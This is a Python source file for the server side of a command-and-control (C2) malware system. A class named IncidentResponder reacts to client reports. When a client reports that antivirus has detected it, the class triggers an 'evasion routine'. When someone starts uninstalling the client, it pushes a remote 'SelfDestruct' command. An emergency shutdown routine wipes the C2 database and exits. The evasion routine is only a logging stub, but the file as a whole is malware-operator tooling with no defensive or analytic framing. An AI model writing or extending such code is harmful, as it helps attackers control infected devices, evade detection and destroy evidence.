import os
import sys
import logging
import requests
import sqlite3
import random
import string
from typing import Optional

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

DB_NAME = os.environ.get('C2_DB_NAME', '../c2/c2_data.db')
C2_URL = os.environ.get('C2_URL', 'http://localhost:5000')

class IncidentResponder:
    def __init__(self):
        self.active_incidents = {}

    def handle_client_report(self, client_id, report_data):
        logger.warning(f"Incident reported by {client_id}: {report_data}")
        if "AV_DETECTED" in report_data:
            self._trigger_evasion_routine(client_id)
        elif "UNINSTALL_INITIATED" in report_data:
            self._trigger_self_destruct(client_id)

    def _trigger_evasion_routine(self, client_id):
        logger.info(f"Triggering evasion routine for {client_id}...")
        new_identity = ''.join(random.choices(string.ascii_letters, k=10))
        logger.info(f"Client {client_id} updated identity to: {new_identity}")

    def _trigger_self_destruct(self, client_id):
        logger.error(f"TRIGGERING SELF-DESTRUCT ON CLIENT {client_id}!")
        try:
            payload = {"device_id": client_id, "command": "SelfDestruct"}
            requests.post(f"{C2_URL}/api/v1/commands/push", json=payload, timeout=5)
        except Exception as e:
            logger.error(f"Self-destruct communication error: {e}")

    def trigger_self_destruct(self, device_id):
        return self._trigger_self_destruct(device_id)

    def shutdown_server(self, wipe_db: bool = True):
        logger.critical("EMERGENCY: Shutting down C2 server and wiping data.")
        if wipe_db and os.path.exists(DB_NAME):
            try:
                os.remove(DB_NAME)
                logger.info("Database wiped.")
            except Exception as e:
                logger.error(f"Failed to wipe database: {e}")
        sys.exit(1)

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--device", help="Device ID to self-destruct")
    parser.add_argument("--shutdown", action="store_true")
    parser.add_argument("--no-wipe", action="store_true")
    args = parser.parse_args()
    ir = IncidentResponder()
    if args.device:
        ir.trigger_self_destruct(args.device)
    if args.shutdown:
        ir.shutdown_server(wipe_db=not args.no_wipe)